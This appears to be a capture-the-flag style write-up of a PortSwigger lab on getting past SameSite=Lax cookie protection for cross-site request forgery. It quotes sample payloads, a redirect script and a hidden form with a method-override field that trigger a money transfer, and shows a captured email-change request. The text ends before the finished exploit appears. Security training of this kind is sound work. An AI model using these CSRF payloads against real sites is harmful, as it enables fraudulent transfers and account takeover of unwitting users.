## Lab Description :

![image](https://github.com/sh3bu/Portswigger_labs/assets/67383098/1a9a6cf7-580e-41d3-95d4-91589742bcfc)


## Overview :

#### Bypassing SameSite Lax restrictions using GET requests

In practice, servers aren't always fussy about whether they receive a GET or POST request to a given endpoint, even those that are expecting a form submission. If they also use Lax restrictions for their session cookies, either explicitly or due to the browser default, you may still be able to perform a CSRF attack by eliciting a GET request from the victim's browser.

As long as the request involves a top-level navigation, the browser will still include the victim's session cookie. The following is one of the simplest approaches to launching such an attack:

```html
<script>
    document.location = 'https://vulnerable-website.com/account/transfer-payment?recipient=hacker&amount=1000000';
</script>
```

Even if an ordinary GET request isn't allowed, some frameworks provide ways of overriding the method specified in the request line. For example, Symfony supports the _method parameter in forms, which takes precedence over the normal method for routing purposes:

```html
<form action="https://vulnerable-website.com/account/transfer-payment" method="POST">
    <input type="hidden" name="_method" value="GET">
    <input type="hidden" name="recipient" value="hacker">
    <input type="hidden" name="amount" value="1000000">
</form>
```
Other frameworks support a variety of similar parameters. 

## Solution :

> This lab's website doesn't enforce samesite cookie mechanism, the samesite mechanism is provided by the browser. We need to bypass it.
> So use **chrome** as it has SAMESITE=Lax by default.

In the email change functionality, update the email of wiener.

![image](https://github.com/sh3bu/Portswigger_labs/assets/67383098/8613f91f-8202-4332-8095-48d4803218e7)


Our browser sends the following POST request to this endpoint.

```http
POST /my-account/change-email HTTP/2
Host: 0a92009d0436580c8098082e002400fb.web-security-academy.net
Cookie: session=15YlHHHZEHTDkTnbetWJ9PntYjmuJR3y
Content-Length: 21
Cache-Control: max-age=0
Sec-Ch-Ua: "Not.A/Brand";v="8", "Chromium";v="114", "Google Chrome";v="114"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Upgrade-Insecure-Requests: 1
Origin: https://0a92009d0436580c8098082e002400fb.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0a92009d0436580c8098082e002400fb.web-security-academy.net/my-account?id=wiener
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8

email=test%40test.net
```

